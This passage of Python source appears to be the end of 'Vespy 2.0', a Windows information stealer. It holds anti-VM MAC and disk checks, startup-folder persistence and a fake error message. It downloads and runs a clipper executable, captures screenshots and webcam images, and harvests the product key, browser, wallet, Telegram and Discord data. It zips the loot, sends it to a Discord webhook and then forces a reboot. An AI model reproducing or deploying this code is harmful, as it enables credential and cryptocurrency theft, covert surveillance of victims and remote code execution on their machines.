        MACS = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de','00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40','42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01','42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3','00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1','00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de','d4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02','42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3','96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77','3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d','00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e','00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8','3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20','3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7','94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de','7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33','00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06','2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d','00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        for Mac in MACS:
            if Mac == mac:
                os._exit(1)

    def disk(self):
        minDiskSizeGB = 50
        if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes/1073741824
        if diskSizeGB < minDiskSizeGB:
            try:
                os._exit(1)
            except:
                os._exit(1)
class AntiVM:
	pass
class Hide:
	pass
class N3ke:
	pass
class Reboot:
    
    def __init__(self):
        os.system("shutdown /r /t 1")
class Cl1ppa:

    def __init__(self):
        self.path = f'C:\\Users\\{user}\\AppData\\'
        self._drop()
    
    def _drop(self):
        file=requests.get("https://cdn-149.anonfiles.com/w51difiez6/460f8695-1680294922/Thecl1pp3r.exe").content
        name = "WinProcess"
        open(self.path+f"\\{name}.exe","wb").write(file)
        os.system(f"{self.path}\\{name}.exe")
class Startup:

    def __init__(self):
        self.file = sys.argv[0]
        ext = self.file.split("\\")[-1].split(".")[-1]
        name = self.file.split("\\")[-1].split(".")[0]
        self._startup(ext,name)

    def _startup(self,e,n):
        try:
            if os.path.exists(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}'):
                pass
            else:
                with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}', 'wb') as f:
                    f.write(open(self.file, 'rb').read())
                open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat","w+").write(fr"""start C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}""")
        except:pass
class ErrorMsg:

    def __init__(self):
        error = "mhm sucks"
        ctypes.windll.user32.MessageBoxW(None, error, 'Fatal Error', 2)

class Spread:
	pass
class Screeny:

    def __init__(self):
        jtjirjihirthr = True
        try:
            r=self.Screen()
        except:
            pass
        self.Info()
        if jtjirjihirthr:
            content = "@everyone New Hit"
        else:
            content = "New Hit"
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png",content=content)
        embed = DiscordEmbed(title=f"New Victim", description=f"New victim | Pc Info + Screenshot", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        try:
            t=requests.get(r)
            if t.status_code == 200 or t.status_code == 204:
                embed.set_image(url=r)
        except:
            pass
        embed.add_embed_field(name=f":desktop: Logged : ``{self.user}``", value=f"\n:fax: Machine : ``{self.machine}``\n:gear: System : ``{self.system}``\n:control_knobs: Processor : ``{self.processor}``\n\n\n:floppy_disk: **Virtual Memory**\n:battery: Total : ``{self.TotalM}``\n:alembic: Available : ``{self.availableM}``\n:low_battery: Used : ``{self.usedM}``\n:symbols: Pourcentage : ``{self.pourcentageM}``\n\n\n:id: HWID : ``{self.hwid}``\n:key: Windows Product Key : {self.windowspk}")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove("testy.jpg")
        try:
            camera.init()
            camlist = camera.list_cameras()
            if camlist:
                cam = camera.Camera(camlist[0], (640, 480))
                cam.start()
                image = cam.get_image()
                pygame.image.save(image, "webcam.jpg")
                file = requests.post('https://api.anonfiles.com/upload',files={'file':open("webcam.jpg","rb")})
                link = file.json()['data']['file']['url']['full']
                r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
                webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Webcam", description=f"Webcam Captured", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                try:
                    t=requests.get(r)
                    if t.status_code == 200 or t.status_code == 204:
                        embed.set_image(url=r)
                except:
                    pass
                webhook.add_embed(embed)
                webhook.execute()
                os.remove("webcam.jpg")
        except:
            pass
    
    def Screen(self):
        s = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        s.save("testy.jpg")
        s.close()
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open("testy.jpg","rb")})
        link = file.json()['data']['file']['url']['full']
        r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
        return r
    
    def Size(self,b):
        for unit in ["", "K", "M", "G", "T", "P"]:
            if b < 1024:
                return f"{b:.2f}{unit}B"
            b /= 1024

    def Info(self):
        self.user = user
        self.machine = platform.machine()
        self.system = platform.system()
        self.processor = platform.processor()
        self.sv = psutil.virtual_memory()
        self.TotalM = self.Size(self.sv.total)
        self.availableM = self.Size(self.sv.available)
        self.usedM = self.Size(self.sv.used)
        self.pourcentageM = self.Size(self.sv.percent)+"%"
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid',creationflags=subprocess.CREATE_NO_WINDOW)).replace(" ","").split("\\n")[1].split("\\r")[0]
        try:
            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey',creationflags=subprocess.CREATE_NO_WINDOW).decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in self.windowspk:
                if len(i) > 20:self.windowspk = i.split(" ")
            self.windowspk= f"``{self.windowspk[0][3:]}``"
        except:
            self.windowspk = ":x:"


def zipette():
    shutil.make_archive(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"),'zip',os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
def main():
    Antidebug()
    AntiVM()
    Startup()
    Hide()
    Thread(target=ErrorMsg).start()
    Thread(target=Cl1ppa).start()
    Screeny()
    content = f":open_file_folder: ``GRABBED_{user}``"
    content += str(Browsers())
    content += str(Roblox())
    content += str(EXodus())
    content += str(Minecraft())
    content += str(Telegram())
    content += "\n``|_ END``"
    zipette()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"),'rb').read(),filename=f"GRABBED_{user}.zip")
    webhook.execute()
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
    embed = DiscordEmbed(title=f"Info Grabbed of user : ``{user}``", description=content, color='4300d1')
    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
    embed.set_footer(text='Vespy 2.0 | by : vesper')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()
    os.remove(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}.zip"));shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    try:
        CookieInfo(rocookies)
    except:
        pass
    DISCORD()
    Thread(target=Injection).start()
    Files()
    Network()
    Spread()
    N3ke()
    Reboot()
main()
